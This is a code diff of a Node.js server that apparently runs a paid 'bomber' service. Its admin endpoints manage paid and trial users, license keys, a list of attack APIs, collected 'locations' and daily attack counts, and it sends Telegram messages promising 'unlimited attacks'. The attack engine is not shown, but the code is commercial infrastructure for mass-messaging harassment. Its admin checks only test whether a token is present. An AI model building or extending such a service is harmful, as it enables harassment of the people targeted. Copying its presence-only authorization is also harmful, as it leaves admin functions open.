-    user.trialBlocked = true;
-  }
-  
-  saveDatabase();
-  addLog('admin', `Added paid user: ${userId}`, { userId, username });
-  
-  // Notify via Telegram if bot exists
-  if (bot) {
-    let botUser = null;
-    for (let i = 0; i < database.botUsers.length; i++) {
-      if (database.botUsers[i].telegramId == userId) {
-        botUser = database.botUsers[i];
-        break;
-      }
-    }
-    if (botUser) {
-      bot.sendMessage(botUser.chatId, '🎉 Congratulations! You are now a PAID user with unlimited attacks!');
-    }
-  }
-  
-  res.json({ success: true, user });
-});
-
-// Remove user
-app.post('/api/admin/remove-user', (req, res) => {
-  const { userId } = req.body;
-  
-  const newUsers = [];
-  for (let i = 0; i < database.users.length; i++) {
-    if (database.users[i].id !== userId) {
-      newUsers.push(database.users[i]);
-    }
-  }
-  database.users = newUsers;
-  saveDatabase();
-  
-  addLog('admin', `Removed user: ${userId}`, { userId });
-  
-  res.json({ success: true });
-});
-
-// Reset trial
-app.post('/api/admin/reset-trial', (req, res) => {
-  const { userId } = req.body;
-  
-  let user = null;
-  for (let i = 0; i < database.users.length; i++) {
-    if (database.users[i].id === userId) {
-      user = database.users[i];
-      break;
-    }
-  }
-  
-  if (user) {
-    user.trialUsed = 0;
-    user.trialBlocked = false;
-    saveDatabase();
-    addLog('admin', `Reset trial for user: ${userId}`, { userId });
-  }
-  
-  res.json({ success: true });
-});
-
-// Add new API
-app.post('/api/admin/add-api', (req, res) => {
-  const newApi = req.body;
-  
-  newApi.id = apisData.apis.length + 1;
-  apisData.apis.push(newApi);
-  
-  fs.writeFileSync('./apis.json', JSON.stringify(apisData, null, 2));
-  
-  addLog('admin', `Added new API: ${newApi.name}`, newApi);
-  
-  res.json({ success: true, api: newApi });
-});
-
-// Get stats
-app.get('/api/admin/stats', (req, res) => {
-  // Count paid users
-  let paidUsers = 0;
-  for (let i = 0; i < database.users.length; i++) {
-    if (database.users[i].isPaid) paidUsers++;
-  }
-  
-  // Count trial users
-  let trialUsers = 0;
-  for (let i = 0; i < database.users.length; i++) {
-    if (database.users[i].trialUsed > 0 && !database.users[i].isPaid) trialUsers++;
-  }
-  
-  // Count attacks today
-  let attacksToday = 0;
-  const today = new Date().toDateString();
-  for (let i = 0; i < database.attacks.length; i++) {
-    if (new Date(database.attacks[i].timestamp).toDateString() === today) {
-      attacksToday++;
-    }
-  }
-  
-  // Count attacks this week
-  let attacksThisWeek = 0;
-  const oneWeekAgo = new Date();
-  oneWeekAgo.setDate(oneWeekAgo.getDate() - 7);
-  for (let i = 0; i < database.attacks.length; i++) {
-    if (new Date(database.attacks[i].timestamp) > oneWeekAgo) {
-      attacksThisWeek++;
-    }
+  if (!adminToken) {
+    return res.json({ success: false, message: 'Unauthorized' });
   }
   
   res.json({
-    totalUsers: database.users.length,
-    paidUsers: paidUsers,
-    trialUsers: trialUsers,
-    totalAttacks: database.attacks.length,
-    totalApis: apisData.apis.length,
-    totalLocations: database.locations.length,
-    botUsers: database.botUsers.length,
-    attacksToday: attacksToday,
-    attacksThisWeek: attacksThisWeek
+    success: true,
+    keys: database.keys
   });
+});
+
+// Get stats (admin only)
+app.post('/admin/api/stats', (req, res) => {
+  const { adminToken } = req.body;
+  
+  if (!adminToken) {
+    return res.json({ success: false, message: 'Unauthorized' });
+  }
+  
+  const activeUsers = database.users.filter(u => new Date() <= new Date(u.expiresAt)).length;
+  const totalAttacks = database.attacks.length;
+  const totalKeys = database.keys.length;
+  const usedKeys = database.keys.filter(k => k.used).length;
+  
+  res.json({
+    success: true,
+    stats: {
+      totalUsers: database.users.length,
+      activeUsers,
+      totalAttacks,
+      totalKeys,
+      usedKeys,
+      availableKeys: totalKeys - usedKeys,
+      totalLocations: database.locations.length
+    }
+  });
+});
+
+// =============== SOCKET.IO ===============
+io.on('connection', (socket) => {
+  console.log('🔌 Client connected:', socket.id);
+  
+  socket.on('disconnect', () => {
+    console.log('🔌 Client disconnected:', socket.id);
+  });
+});
+
+// Serve main page
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Serve admin panel
+app.get('/admin', (req, res) => {
+  res.sendFile(path.join(__dirname, 'admin', 'admin-panel.html'));
 });
 
 // Start server
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`
 ╔══════════════════════════════════════════════════════════════════╗
-║              ⚡ FLASH BOMBER ADVANCED EDITION ⚡                ║
+║              ⚡ SHAIQUA PRIMIUM ADVANCED EDITION ⚡                ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║                                                                  ║
 ║  📡 Server URL: http://localhost:${PORT}                             ║
 ║  📊 Total APIs: ${apisData.apis.length}                                         ║
+║  🔑 Key System: ✅ ACTIVE                                         ║
 ║  👥 Total Users: ${database.users.length}                                        ║
-║  🤖 Bot Status: ${bot ? '✅ ACTIVE' : '❌ DISABLED'}                                    ║
-║  🌐 Socket.IO: ✅ ENABLED                                         ║
-║    👿  TU JAAA RE CHAPRI                                     ║
 ║                                                                  ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║                                                                  ║
-║  🔑 Admin Login: CHAL HTTT.                                ║
-║  🤖 Telegram Bot: KYU BATAU                                ║
-║  📞 Support: SHAIQUA                                         ║
+║  🔑 Admin Panel: http://localhost:${PORT}/admin                      ║
+║  🔐 Admin Password: ${ADMIN_PASSWORD}                                   ║
+║  📞 Support: @introvert_O2z                                       ║
 ║                                                                   ║
 ╚══════════════════════════════════════════════════════════════════╝
   `);
